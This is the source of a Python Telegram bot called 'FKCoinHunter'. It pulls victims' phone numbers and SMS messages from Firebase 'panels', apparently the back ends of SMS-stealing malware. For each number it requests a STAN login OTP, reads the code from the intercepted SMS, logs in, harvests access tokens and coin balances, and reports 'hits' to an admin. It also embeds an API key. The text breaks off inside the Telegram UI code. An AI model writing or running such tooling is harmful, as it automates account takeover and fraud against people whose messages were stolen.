#!/usr/bin/env python3
"""
FKCoinHunter - Telegram Bot
Full conversion of web_panel.py → Telegram
Hosted on Railway
"""

import os
import sys
import json
import logging
import threading
import time
import re
import secrets
import base64
import urllib.parse
import asyncio
from datetime import datetime
from typing import Optional, Dict, List, Set, Tuple
from dataclasses import dataclass, field
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)
from telegram.constants import ParseMode
from http.server import HTTPServer, BaseHTTPRequestHandler

# ============ CONFIG ============
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID_ENV = os.getenv("ADMIN_ID", "")
ADMIN_ID = int(ADMIN_ID_ENV) if ADMIN_ID_ENV else None

STAN_API_KEY = os.getenv(
    "STAN_API_KEY",
    "af3a3dbe4aeb1af819ce7657b029259324305498164ac0e37c7d614389d8b4d9"
)
STAN_API_BASE = "https://api.getstan.app"
MIN_FK_BALANCE = 10
HIT_THRESHOLD = 75
OTP_WAIT_SECONDS = 20
OTP_CHECK_INTERVAL = 3
MAX_WORKERS = 10
DATA_DIR = os.getenv("DATA_DIR", ".")
os.makedirs(DATA_DIR, exist_ok=True)

PANELS_FILE = os.path.join(DATA_DIR, "panels.json")
HITS_FILE = os.path.join(DATA_DIR, "hits.json")
ACCOUNTS_FILE = os.path.join(DATA_DIR, "stan_accounts_full.json")

# ============ LOGGING ============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger("FKCoinHunter")

# ============ GLOBALS ============
bot_app: Optional[Application] = None
main_loop: Optional[asyncio.AbstractEventLoop] = None
admin_chat_id: Optional[int] = None

auto_status = {
    'running': False,
    'total_processed': 0,
    'successful': 0,
    'failed': 0,
    'no_otp': 0,
    'already_registered': 0,
    'hits': 0,
    'total_balance': 0,
    'current_action': 'Idle',
    'recent_accounts': [],
    'recent_hits': [],
    'database_url': '',
    'processing_logs': [],
    'current_panel': '',
    'panel_index': 0,
    'total_panels': 0,
    'last_update': datetime.now().isoformat(),
    'active_workers': 0
}

# ============ OTP PATTERNS (from 5.py) ============
OTP_PATTERNS = [
    {"pattern": r"(\d{4,6})\s+is the otp for mobile verification on STAN", "keyword": "stan", "priority": 1},
    {"pattern": r"STAN.*?OTP[:\s]*(\d{4,6})", "keyword": "stan", "priority": 2},
    {"pattern": r"OTP[:\s]*(\d{4,6}).*?STAN", "keyword": "stan", "priority": 3},
    {"pattern": r"(\d{4,6})\s+is your OTP for STAN", "keyword": "stan", "priority": 4},
]

# ============ DATA ============
@dataclass
class Account:
    phone: str
    access_token: str
    refresh_token: str
    firebase_token: str
    user_id: int
    username: str
    fk_balance: int
    device_uid: str
    user_agent: str
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    saved: bool = False
    device_id: str = ""
    firebase_url: str = ""

    def to_dict(self):
        return {
            'phone': self.phone,
            'access_token': self.access_token,
            'refresh_token': self.refresh_token,
            'firebase_token': self.firebase_token,
            'user_id': self.user_id,
            'username': self.username,
            'fk_balance': self.fk_balance,
            'device_uid': self.device_uid,
            'user_agent': self.user_agent,
            'created_at': self.created_at,
            'saved': self.saved,
            'device_id': self.device_id,
            'firebase_url': self.firebase_url
        }

# ============ NOTIFICATION HELPERS ============
def send_log(message: str, log_type: str = 'info'):
    entry = {
        'timestamp': datetime.now().strftime('%H:%M:%S'),
        'message': message,
        'type': log_type
    }
    auto_status['processing_logs'].append(entry)
    if len(auto_status['processing_logs']) > 500:
        auto_status['processing_logs'] = auto_status['processing_logs'][-500:]
    logger.info(f"[{log_type.upper()}] {message}")


def notify_admin(text: str):
    """Send notification to admin chat (thread-safe)."""
    if not admin_chat_id or not bot_app or not main_loop:
        return
    try:
        asyncio.run_coroutine_threadsafe(
            bot_app.bot.send_message(admin_chat_id, text, parse_mode=ParseMode.HTML),
            main_loop
        )
    except Exception as e:
        logger.error(f"notify_admin failed: {e}")


# ============ 5.py FIREBASE LOGIC ============
def parse_panel_link(link: str) -> Optional[Tuple[str, str]]:
    if "?s=" in link:
        parsed = urllib.parse.urlparse(link)
        qs = urllib.parse.parse_qs(parsed.query)
        if 's' in qs:
            s_param = qs['s'][0]
            s_param += "=" * ((4 - len(s_param) % 4) % 4)
            try:
                decoded = base64.b64decode(s_param).decode('utf-8')
                for sep in ['|||', '|']:
                    if sep in decoded:
                        parts = decoded.split(sep)
                        if len(parts) >= 2:
                            firebase_url = parts[0].strip()
                            api_key = parts[1].strip()
                            if firebase_url and api_key:
                                if not firebase_url.endswith('/'):
                                    firebase_url += '/'
                                return firebase_url, api_key
            except:
                pass
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        if not link.endswith('/'):
            link += '/'
        return link, None
    return None


def fetch_phones_from_panel(panel: dict, limit: int = 100) -> List[Tuple[str, str]]:
    url = panel["url"]
    try:
        clients_req = requests.get(url + 'clients.json', timeout=5)
        clients = clients_req.json() or {}
    except Exception as e:
        send_log(f"❌ Failed to fetch clients from {panel.get('name')}: {e}", 'error')
        return []

    phones = []
    count = 0
    for c_id, c_data in clients.items():
        if count >= limit:
            break
        if not isinstance(c_data, dict):
            continue
        if not c_data.get("status"):
            continue
        phone = c_data.get("mobNo") or c_data.get("phone") or c_data.get("mobile")
        if not phone:
            try:
                msg_resp = requests.get(f"{url}messages/{c_id}.json", timeout=3)
                if msg_resp.status_code == 200:
                    msgs = msg_resp.json() or {}
                    for msg in msgs.values():
                        if not isinstance(msg, dict):
                            continue
                        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                        match = re.search(r'\b([6-9]\d{9})\b', text)
                        if match:
                            phone = match.group(1)
                            break
            except:
                pass
        if phone:
            phone = re.sub(r'\D', '', phone)
            if len(phone) == 10 and phone[0] in "6789":
                phones.append((phone, c_id))
                count += 1
    return phones


def fetch_messages_for_device(firebase_url: str, device_id: str) -> List[Dict]:
    if not firebase_url or not device_id:
        return []
    try:
        url = f"{firebase_url}messages/{device_id}.json"
        resp = requests.get(url, timeout=5)
        if resp.status_code != 200:
            return []
        msgs = resp.json()
        if not msgs:
            return []
        sorted_msgs = sorted(
            msgs.items(),
            key=lambda x: int(x[0]) if str(x[0]).isdigit() else 0,
            reverse=True
        )
        messages = []
        for msg_id, msg_data in sorted_msgs[:5]:
            if isinstance(msg_data, dict):
                messages.append({
                    'sender': msg_data.get('sender', 'Unknown'),
                    'text': msg_data.get('body') or msg_data.get('message') or msg_data.get('text', ''),
                    'timestamp': msg_id
                })
        return messages
    except Exception as e:
        send_log(f"Error fetching messages for {device_id}: {e}", 'error')
        return []


def poll_otp_from_panel(firebase_url: str, device_id: str, sender_keyword: str = "STAN",
                        timeout: int = OTP_WAIT_SECONDS) -> Optional[str]:
    start = time.time()
    trigger_time = int(time.time() * 1000)
    while time.time() - start < timeout:
        try:
            url = f"{firebase_url}messages/{device_id}.json"
            resp = requests.get(url, timeout=3)
            if resp.status_code != 200:
                time.sleep(1)
                continue
            msgs = resp.json()
            if not msgs:
                time.sleep(1)
                continue
            for msg_id in sorted(msgs.keys(), reverse=True):
                msg_data = msgs[msg_id]
                if not isinstance(msg_data, dict):
                    continue
                try:
                    msg_ts = int(msg_id)
                except:
                    continue
                if msg_ts < trigger_time:
                    continue
                sender = msg_data.get("sender", "")
                body = msg_data.get("body") or msg_data.get("message") or msg_data.get("text") or ""
                if sender_keyword.lower() in sender.lower():
                    for pattern_config in OTP_PATTERNS:
                        pattern = pattern_config["pattern"]
                        kw = pattern_config["keyword"]
                        if kw and kw.lower() not in body.lower():
                            continue
                        match = re.search(pattern, body, re.IGNORECASE)
                        if match:
                            otp = match.group(1)
                            if 4 <= len(otp) <= 6:
                                return otp
                    match = re.search(r'(?<!\d)(\d{4}|\d{6})(?!\d)', body)
                    if match:
                        return match.group(0)
            time.sleep(1)
        except Exception:
            time.sleep(1)
    return None


# ============ STAN API ============
def format_phone(phone: str) -> str:
    phone = re.sub(r'[^0-9+]', '', phone.strip())
    if phone.startswith('+91') and len(phone) == 13:
        return phone
    if phone.startswith('0'):
        phone = phone[1:]
    if phone.startswith('91'):
        return '+' + phone if len(phone) == 12 else '+91' + phone
    if len(phone) == 10:
        return '+91' + phone
    return f"+91{phone[-10:]}" if len(phone) >= 10 else f"+91{phone}"


def send_stan_otp(phone, user_agent):
    url = f"{STAN_API_BASE}/api/v1/auth/otp/store/send"
    headers = {
        "x-api-key": STAN_API_KEY, "appversion": "500", "platform": "android",
        "user-agent": user_agent, "accept": "application/json, text/plain, */*",
        "content-type": "application/json", "origin": "https://www.stanshop.co",
        "x-requested-with": "mark.via.gp",
    }
    try:
        r = requests.post(url, headers=headers, json={"phone": phone}, timeout=30)
        if r.status_code == 200:
            data = r.json()
            if data.get("statusCode") == 10047 or "already" in str(data).lower():
                return {"success": False, "already_registered": True}
            return {"success": True, "data": data}
        return {"success": False, "error": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def verify_stan_otp(phone, otp, user_agent, device_uuid):
    url = f"{STAN_API_BASE}/api/v4/store/verify/otp"
    payload = {
        "phone": phone, "otp": otp, "sessionId": None,
        "deviceInfo": {"APP_TYPE": "android", "DeviceData": {"deviceUID": device_uuid}},
        "utmPayload": {}, "campaignUrl": ""
    }
    headers = {
        "x-api-key": STAN_API_KEY, "appversion": "500", "platform": "android",
        "user-agent": user_agent, "accept": "application/json, text/plain, */*",
        "content-type": "application/json", "origin": "https://www.stanshop.co",
        "x-requested-with": "mark.via.gp", "referer": "https://www.stanshop.co/",
    }
    try:
        r = requests.post(url, headers=headers, json=payload, timeout=60)
        if r.status_code == 200:
            data = r.json()
            if data.get("access_token"):
                return {
                    'success': True,
                    'access_token': data.get("access_token"),
                    'refresh_token': data.get("refresh_token", ''),
                    'firebase_token': data.get("firebase_token", ''),
                    'user_data': data.get("user", {})
                }
            if data.get("message") == "Invalid OTP":
                return {'success': False, 'error': 'Invalid OTP'}
        elif r.status_code == 400:
            return {'success': False, 'error': 'HTTP 400 - Bad Request'}
        return {'success': False, 'error': f'HTTP {r.status_code}'}
    except Exception as e:
        return {'success': False, 'error': str(e)}


def get_stan_balance(access_token, user_agent):
    if not access_token:
        return 0
    url = f"{STAN_API_BASE}/api/v1/shop/client/balance?vendor=all"
    headers = {
        "x-api-key": STAN_API_KEY, "appversion": "500", "platform": "android",
        "user-agent": user_agent, "accept": "application/json, text/plain, */*",
        "authorization": f"Bearer {access_token}", "countrycode": "IN"
    }
    try:
        r = requests.get(url, headers=headers, timeout=30)
        if r.status_code == 200:
            data = r.json()
            if data.get("statusCode") == 200:
                return data.get("message", {}).get("fkcoin_balance", 0)
        return 0
    except:
        return 0


# ============ DATABASE MANAGER ============
class DatabaseManager:
    def __init__(self):
        self.panels: List[Dict] = []
        self.current_panel_index = 0
        self._load()

    def _load(self):
        try:
            if os.path.exists(PANELS_FILE):
                with open(PANELS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.panels = data.get('panels', [])
                    self.current_panel_index = data.get('current_index', 0)
                auto_status['total_panels'] = len(self.panels)
                auto_status['panel_index'] = self.current_panel_index + 1
        except Exception as e:
            logger.error(f"load panels: {e}")
            self.panels = []

    def _save(self):
        try:
            with open(PANELS_FILE, 'w', encoding='utf-8') as f:
                json.dump({
                    'panels': self.panels,
                    'current_index': self.current_panel_index,
                    'last_updated': datetime.now().isoformat()
                }, f, indent=2)
        except Exception as e:
            logger.error(f"save panels: {e}")

    def add_databases(self, urls: List[str]) -> int:
        added = 0
        for url in urls:
            url = url.strip()
            if not url:
                continue
            parsed = parse_panel_link(url)
            if not parsed:
                continue
            firebase_url, api_key = parsed
            name = firebase_url.replace("https://", "").replace("http://", "").split('.')[0] or f"Panel_{len(self.panels)+1}"
            panel = {"name": name, "url": firebase_url, "api_key": api_key, "sender": "STAN"}
            if panel not in self.panels:
                self.panels.append(panel)
                added += 1
        self._save()
        auto_status['total_panels'] = len(self.panels)
        return added

    def get_databases(self) -> List[str]:
        return [p.get('url', '') for p in self.panels]

    def get_current_db(self) -> Optional[str]:
        if self.panels and 0 <= self.current_panel_index < len(self.panels):
            return self.panels[self.current_panel_index].get('url')
        return None

    def set_current_db(self, index: int) -> bool:
        if 0 <= index < len(self.panels):
            self.current_panel_index = index
            self._save()
            auto_status['panel_index'] = index + 1
            auto_status['current_panel'] = self.panels[index].get('name', '')
            return True
        return False

    def remove_database(self, index: int) -> bool:
        if 0 <= index < len(self.panels):
            self.panels.pop(index)
            if self.current_panel_index >= len(self.panels):
                self.current_panel_index = max(0, len(self.panels) - 1)
            self._save()
            auto_status['total_panels'] = len(self.panels)
            auto_status['panel_index'] = self.current_panel_index + 1
            return True
        return False

    def get_current_panel(self) -> Optional[Dict]:
        if self.panels and 0 <= self.current_panel_index < len(self.panels):
            return self.panels[self.current_panel_index]
        return None

    def get_panels(self) -> List[Dict]:
        return self.panels.copy()

    def move_to_next_panel(self) -> bool:
        if not self.panels:
            return False
        return self.set_current_db((self.current_panel_index + 1) % len(self.panels))


# ============ HIT MANAGER ============
class HitManager:
    def __init__(self):
        self.hits: List[Dict] = []
        self._load()

    def _load(self):
        if os.path.exists(HITS_FILE):
            try:
                with open(HITS_FILE, 'r', encoding='utf-8') as f:
                    self.hits = json.load(f)
            except Exception as e:
                logger.error(f"load hits: {e}")
                self.hits = []

    def _save(self):
        try:
            with open(HITS_FILE, 'w', encoding='utf-8') as f:
                json.dump(self.hits, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"save hits: {e}")

    def add_hit(self, account: Account, messages: List[Dict], firebase_url: str, device_id: str) -> bool:
        for h in self.hits:
            if h.get('phone') == account.phone:
                return False
        self.hits.append({
            'phone': account.phone,
            'username': account.username,
            'fk_balance': account.fk_balance,
            'user_id': account.user_id,
            'device_uid': account.device_uid,
            'created_at': account.created_at,
            'access_token': (account.access_token[:50] + '...') if account.access_token else '',
            'firebase_url': firebase_url,
            'device_id': device_id,
            'messages': messages or []
        })
        self._save()
        return True

    def get_hits(self) -> List[Dict]:
        return self.hits.copy()

    def get_hit(self, index: int) -> Optional[Dict]:
        if 0 <= index < len(self.hits):
            return self.hits[index].copy()
        return None

    def refresh_messages(self, index: int) -> List[Dict]:
        hit = self.get_hit(index)
        if not hit:
            return []
        msgs = fetch_messages_for_device(hit.get('firebase_url', ''), hit.get('device_id', ''))
        if 0 <= index < len(self.hits):
            self.hits[index]['messages'] = msgs
            self._save()
        return msgs


# ============ ACCOUNT MANAGER ============
class AccountManager:
    def __init__(self):
        self.accounts: List[Account] = []
        self.processed_numbers: Set[str] = set()
        self.successful_numbers: Set[str] = set()
        self.failed_numbers: Set[str] = set()
        self.no_otp_numbers: Set[str] = set()
        self.stats = {
            'total_processed': 0, 'successful': 0, 'failed': 0, 'no_otp': 0,
            'already_registered': 0, 'skipped': 0, 'total_balance': 0,
            'saved_accounts': 0, 'hits': 0, 'http_400_errors': 0
        }
        self._lock = threading.Lock()
        self.processed_lock = threading.Lock()
        self.hit_manager = HitManager()
        self._load()

    def _load(self):
        if os.path.exists(ACCOUNTS_FILE):
            try:
                with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
                    for d in json.load(f):
                        if d.get('phone'):
                            acc = Account(
                                phone=d.get('phone', ''),
                                access_token=d.get('access_token', ''),
                                refresh_token=d.get('refresh_token', ''),
                                firebase_token=d.get('firebase_token', ''),
                                user_id=d.get('user_id', 0),
                                username=d.get('username', 'User'),
                                fk_balance=d.get('fk_balance', 0),
                                device_uid=d.get('device_uid', ''),
                                user_agent=d.get('user_agent', ''),
                                created_at=d.get('created_at', datetime.now().isoformat()),
                                saved=d.get('saved', False),
                                device_id=d.get('device_id', ''),
                                firebase_url=d.get('firebase_url', '')
                            )
                            self.accounts.append(acc)
                            self.successful_numbers.add(acc.phone)
                            self.processed_numbers.add(acc.phone)
                            if acc.fk_balance >= HIT_THRESHOLD:
                                self.stats['hits'] += 1
            except Exception as e:
                logger.error(f"load accounts: {e}")

    def _append_account(self, account: Account):
        try:
            data = []
            if os.path.exists(ACCOUNTS_FILE):
                with open(ACCOUNTS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
            data.append(account.to_dict())
            with open(ACCOUNTS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"save account: {e}")

    def add_account(self, account: Account, messages=None, firebase_url=None, device_id=None) -> bool:
        with self._lock:
            for ex in self.accounts:
                if ex.phone == account.phone:
                    return False
            account.device_id = device_id or ""
            account.firebase_url = firebase_url or ""
            self.accounts.append(account)
            self.successful_numbers.add(account.phone)
            self.processed_numbers.add(account.phone)
            self.stats['successful'] += 1
            if account.fk_balance >= MIN_FK_BALANCE:
                account.saved = True
                self.stats['saved_accounts'] += 1
            self.stats['total_balance'] += account.fk_balance
            if account.fk_balance >= HIT_THRESHOLD:
                self.stats['hits'] += 1
                self.hit_manager.add_hit(account, messages or [], firebase_url or "", device_id or "")
                auto_status['hits'] = self.stats['hits']
                notify_admin(
                    f"⭐ <b>HIT!</b>\n"
                    f"📱 <code>{account.phone}</code>\n"
                    f"💰 <b>{account.fk_balance} FK</b>\n"
                    f"👤 {account.username}"
                )
            self._append_account(account)
            return True

    def mark_processed(self, phone: str):
        with self.processed_lock:
            if phone not in self.processed_numbers:
                self.processed_numbers.add(phone)
                self.stats['total_processed'] += 1
                auto_status['total_processed'] = self.stats['total_processed']

    def mark_failed(self, phone: str, reason: str = 'Unknown'):
        with self._lock:
            self.failed_numbers.add(phone)
            self.stats['failed'] += 1
            auto_status['failed'] = self.stats['failed']

    def mark_no_otp(self, phone: str):
        with self._lock:
            self.no_otp_numbers.add(phone)
            self.stats['no_otp'] += 1
            auto_status['no_otp'] = self.stats['no_otp']

    def is_processed(self, phone: str) -> bool:
        with self.processed_lock:
            return phone in self.processed_numbers or phone in self.successful_numbers

    def get_accounts(self) -> List[Dict]:
        return [a.to_dict() for a in self.accounts]

    def get_stats(self) -> Dict:
        return self.stats.copy()


# ============ AUTOMATION WORKER ============
class AutomationWorker:
    def __init__(self, am: AccountManager, dm: DatabaseManager):
        self.am = am
        self.dm = dm
        self.running = False
        self.thread: Optional[threading.Thread] = None
        self.executor: Optional[ThreadPoolExecutor] = None
        self.failed_count = 0
        self.processed_count = 0
        self.lock = threading.Lock()

    def start(self):
        with self.lock:
            if self.running:
                return False
            self.running = True
            self.failed_count = 0
            self.processed_count = 0
            self.executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
            self.thread = threading.Thread(target=self._run, daemon=True)
            self.thread.start()
        send_log(f"🔄 Automation started ({MAX_WORKERS} workers)", 'success')
        auto_status['running'] = True
        notify_admin(f"🚀 <b>Automation Started</b> — {MAX_WORKERS} workers")
        return True

    def stop(self):
        with self.lock:
            self.running = False
            if self.executor:
                self.executor.shutdown(wait=False)
        send_log("⏹ Automation stopped", 'warning')
        auto_status['running'] = False
        auto_status['active_workers'] = 0
        auto_status['current_action'] = 'Idle'
        notify_admin("⏹ <b>Automation Stopped</b>")

    def _move_next_panel(self):
        panels = self.dm.get_panels()
        if not panels:
            return False
        cur = self.dm.current_panel_index
        nxt = (cur + 1) % len(panels)
        if self.dm.set_current_db(nxt):
            name = self.dm.get_current_panel().get('name', '?')
            send_log(f"🔄 Switched to Panel {nxt+1}/{len(panels)}: {name}", 'info')
            auto_status['database_url'] = self.dm.get_current_db()
            auto_status['current_panel'] = name
            auto_status['panel_index'] = nxt + 1
            self.failed_count = 0
            self.processed_count = 0
            return True
        return False

    def _run(self):
        while self.running:
            try:
                panels = self.dm.get_panels()
                if not panels:
                    send_log("⚠️ No panels. Add one with /addpanel", 'warning')
                    time.sleep(10)
                    continue

                panel = self.dm.get_current_panel()
                if not panel or panel not in panels:
                    self.dm.set_current_db(0)
                    panel = self.dm.get_current_panel()
                    if not panel:
                        time.sleep(5)
                        continue

                firebase_url = panel.get("url")
                sender_keyword = panel.get("sender", "STAN")
                idx = self.dm.current_panel_index
                total = len(panels)
                name = panel.get('name', '?')

                auto_status['current_panel'] = name
                auto_status['panel_index'] = idx + 1
                auto_status['total_panels'] = total
                auto_status['database_url'] = firebase_url
                auto_status['current_action'] = f'Fetching {name}'

                send_log(f"📡 Panel {idx+1}/{total}: {name}", 'info')
                devices = fetch_phones_from_panel(panel, limit=100)

                if not devices:
                    send_log(f"⚠️ No devices in {name}. Moving on…", 'warning')
                    self._move_next_panel()
                    time.sleep(2)
                    continue

                send_log(f"📋 {len(devices)} devices in {name}", 'info')

                available = [(p, d) for p, d in devices if not self.am.is_processed(p)]
                if not available:
                    send_log(f"✅ All devices in {name} processed. Next panel.", 'success')
                    self._move_next_panel()
                    time.sleep(2)
                    continue

                total_avail = len(available)
                send_log(f"🆕 {total_avail} new devices in {name}", 'info')

                processed_total = 0
                failed_total = 0
                batch_num = 1

                while processed_total < total_avail and self.running:
                    start = processed_total
                    end = min(processed_total + MAX_WORKERS, total_avail)
                    batch = available[start:end]

                    send_log(f"🚀 Batch {batch_num}: {len(batch)} devices (remaining {total_avail - processed_total})", 'info')

                    futures = []
                    for phone, dev in batch:
                        if not self.running:
                            break
                        futures.append(self.executor.submit(
                            self._process_device, phone, dev, firebase_url, sender_keyword
                        ))

                    auto_status['active_workers'] = len([f for f in futures if not f.done()])

                    batch_ok = 0
                    batch_fail = 0
                    completed = 0
                    for fut in as_completed(futures):
                        try:
                            ok = fut.result(timeout=120)
                            if ok:
                                batch_ok += 1
                                self.processed_count += 1
                                self.failed_count = 0
                            else:
                                batch_fail += 1
                                self.failed_count += 1
                        except Exception as e:
                            batch_fail += 1
                            self.failed_count += 1
                            send_log(f"❌ Worker error: {e}", 'error')
                        completed += 1
                        processed_total += 1
                        auto_status['active_workers'] = len([f for f in futures if not f.done()])
                        if completed % 2 == 0 or completed == len(futures):
                            send_log(f"📊 Batch {batch_num}: {completed}/{len(futures)} ({batch_ok}✅ {batch_fail}❌)", 'info')

                    batch_num += 1
                    failed_total += batch_fail
                    auto_status['active_workers'] = 0
                    send_log(f"📊 Batch {batch_num-1} done: {batch_ok}✅ {batch_fail}❌", 'info')

                    if self.failed_count >= 10:
                        send_log(f"⚠️ 10 consecutive fails in {name}. Cycling panel.", 'warning')
                        break

                    if processed_total < total_avail:
                        time.sleep(2)

                send_log(
                    f"📊 Panel {name} complete: {processed_total - failed_total}✅ "
                    f"{failed_total}❌ / {total_avail}", 'info'
                )
                self._move_next_panel()
                auto_status['current_action'] = 'Idle'
                time.sleep(2)

            except Exception as e:
                send_log(f"❌ Worker loop error: {e}", 'error')
                self._move_next_panel()
                time.sleep(5)

        auto_status['current_action'] = 'Idle'
        auto_status['active_workers'] = 0

    def _process_device(self, phone: str, device_id: str, firebase_url: str, sender_keyword: str) -> bool:
        if self.am.is_processed(phone):
            return False
        self.am.mark_processed(phone)

        try:
            formatted = format_phone(phone)
            wid = threading.current_thread().name
            send_log(f"[{wid}] 📱 {formatted}", 'info')

            user_agent = "Mozilla/5.0 (Linux; Android 14; SM-A065F) AppleWebKit/537.36"
            device_uuid = secrets.token_hex(8)

            otp_resp = send_stan_otp(formatted, user_agent)
            if otp_resp.get("already_registered"):
                send_log(f"[{wid}] ⚠️ {formatted} - already registered", 'warning')
                self.am.stats['already_registered'] += 1
                self.am.mark_failed(phone, 'Already registered')
                return False
            if not otp_resp.get("success"):
                send_log(f"[{wid}] ❌ {formatted} - OTP request failed", 'error')
                self.am.mark_failed(phone, 'OTP request failed')
                return False

            send_log(f"[{wid}] ✅ OTP sent to {formatted}, polling Firebase…", 'success')
            otp = poll_otp_from_panel(firebase_url, device_id, sender_keyword, OTP_WAIT_SECONDS)
            if not otp:
                send_log(f"[{wid}] ⏰ {formatted} - no OTP received", 'warning')
                self.am.mark_no_otp(phone)
                self.am.mark_failed(phone, 'No OTP')
                return False
            send_log(f"[{wid}] 🔑 OTP: {otp} for {formatted}", 'success')

            v_resp = verify_stan_otp(formatted, otp, user_agent, device_uuid)
            if not v_resp.get('success'):
                err = v_resp.get('error', 'verify failed')
                send_log(f"[{wid}] ❌ {formatted}: {err}", 'error')
                if "400" in err:
                    self.am.stats['http_400_errors'] += 1
                self.am.mark_failed(phone, 'Verify failed')
                return False

            access_token = v_resp['access_token']
            refresh_token = v_resp.get('refresh_token', '')
            firebase_token = v_resp.get('firebase_token', '')
            user_data = v_resp.get('user_data', {})
            username = user_data.get('username', 'User')
            user_id = user_data.get('id', 0)

            balance = get_stan_balance(access_token, user_agent)
            messages = fetch_messages_for_device(firebase_url, device_id)

            account = Account(
                phone=formatted,
                access_token=access_token,
                refresh_token=refresh_token,
                firebase_token=firebase_token,
                user_id=user_id,
                username=username,
                fk_balance=balance,
                device_uid=device_uuid,
                user_agent=user_agent,
                created_at=datetime.now().isoformat(),
                saved=(balance >= MIN_FK_BALANCE),
                device_id=device_id,
                firebase_url=firebase_url
            )
            self.am.add_account(account, messages, firebase_url, device_id)
            auto_status['successful'] = self.am.stats['successful']
            auto_status['total_balance'] = self.am.stats['total_balance']
            auto_status['hits'] = self.am.stats['hits']

            is_hit = balance >= HIT_THRESHOLD
            if is_hit:
                send_log(f"[{wid}] ⭐ HIT {formatted} | {balance} FK | {username}", 'hit')
                auto_status['recent_hits'].append({
                    'phone': formatted, 'balance': balance,
                    'username': username,
                    'time': datetime.now().strftime('%H:%M:%S')
                })
                auto_status['recent_hits'] = auto_status['recent_hits'][-10:]
            else:
                send_log(f"[{wid}] ✅ {formatted} | {balance} FK | {username}", 'success')

            auto_status['recent_accounts'].append({
                'phone': formatted, 'balance': balance,
                'username': username, 'is_hit': is_hit,
                'time': datetime.now().strftime('%H:%M:%S')
            })
            auto_status['recent_accounts'] = auto_status['recent_accounts'][-20:]
            return True

        except Exception as e:
            send_log(f"❌ Error on {phone}: {e}", 'error')
            self.am.mark_failed(phone, str(e))
            return False


# ============ INSTANCES ============
am = AccountManager()
dm = DatabaseManager()
worker = AutomationWorker(am, dm)


# ============ TELEGRAM UI ============
def main_menu_kb():
    running = auto_status['running']
    start_btn = InlineKeyboardButton("⏹ Stop" if running else "▶️ Start",
                                     callback_data="stop_auto" if running else "start_auto")
    return InlineKeyboardMarkup([
        [start_btn, InlineKeyboardButton("📊 Status", callback_data="status")],
        [InlineKeyboardButton("📡 Panels", callback_data="panels_menu"),
         InlineKeyboardButton("⭐ Hits", callback_data="hits_menu")],
        [InlineKeyboardButton("👤 Accounts", callback_data="accounts_menu"),
         InlineKeyboardButton("📜 Logs", callback_data="logs_menu")],
        [InlineKeyboardButton("📤 Export", callback_data="export_menu")],
    ])


def status_text() -> str:
    s = auto_status
    st = am.get_stats()
    running_icon = "🟢" if s['running'] else "🔴"
    return (
        f"{running_icon} <b>FKCoinHunter Status</b>\n"
        f"────────────────────\n"
        f"📡 Panel: <b>{s.get('current_panel', '—')}</b> "
        f"({s.get('panel_index', 0)}/{s.get('total_panels', 0)})\n"
        f"⚙️ Action: {s.get('current_action', 'Idle')}\n"
        f"👷 Active Workers: <b>{s.get('active_workers', 0)}/{MAX_WORKERS}</b>\n"
        f"────────────────────\n"
        f"📊 <b>Stats</b>\n"
        f"• Processed: <b>{st['total_processed']}</b>\n"
        f"• ✅ Success: <b>{st['successful']}</b>\n"
        f"• ❌ Failed: <b>{st['failed']}</b>\n"
        f"• ⏰ No OTP: <b>{st['no_otp']}</b>\n"
        f"• ⚠️ Already reg: <b>{st['already_registered']}</b>\n"
        f"• ⭐ Hits: <b>{st['hits']}</b>\n"
        f"• 💰 Total Balance: <b>{st['total_balance']} FK</b>\n"
        f"────────────────────\n"
        f"🎯 Hit threshold: <b>{HIT_THRESHOLD} FK</b>\n"
        f"💾 Saved threshold: <b>{MIN_FK_BALANCE} FK</b>"
    )


def panels_kb():
    kb = []
    for i, p in enumerate(dm.get_panels()):
        marker = "🟢" if i == dm.current_panel_index else "⚪"
        kb.append([
            InlineKeyboardButton(f"{marker} {i+1}. {p.get('name','?')}",
                                 callback_data=f"panel_view_{i}"),
            InlineKeyboardButton("🗑", callback_data=f"panel_del_{i}")
        ])
    kb.append([InlineKeyboardButton("➕ Add Panel", callback_data="panel_add")])
    kb.append([InlineKeyboardButton("⏭ Next Panel", callback_data="panel_next"),
               InlineKeyboardButton("🔍 Fetch Devices", callback_data="panel_fetch")])
    kb.append([InlineKeyboardButton("🔙 Back", callback_data="menu")])
    return InlineKeyboardMarkup(kb)


def hits_kb(page: int = 0, per_page: int = 8):
    hits = am.hit_manager.get_hits()
    total = len(hits)
    start = page * per_page
    end = min(start + per_page, total)
    kb = []
    for i in range(start, end):
        h = hits[i]
        kb.append([InlineKeyboardButton(
            f"⭐ {h['phone']} | {h['fk_balance']} FK",
            callback_data=f"hit_view_{i}"
        )])
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️", callback_data=f"hits_page_{page-1}"))
    if end < total:
        nav.append(InlineKeyboardButton("➡️", callback_data=f"hits_page_{page+1}"))
    if nav:
        kb.append(nav)
    kb.append([InlineKeyboardButton("🔙 Back", callback_data="menu")])
    return InlineKeyboardMarkup(kb), total, page, per_page


def accounts_kb(page: int = 0, per_page: int = 5):
    accs = am.get_accounts()
    total = len(accs)
    start = page * per_page
    end = min(start + per_page, total)
    text_lines = []
    for a in accs[start:end]:
        text_lines.append(
            f"👤 <code>{a['phone']}</code> — <b>{a['fk_balance']} FK</b>"
        )
    kb = []
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️", callback_data=f"acc_page_{page-1}"))
    if end < total:
        nav.append(InlineKeyboardButton("➡️", callback_data=f"acc_page_{page+1}"))
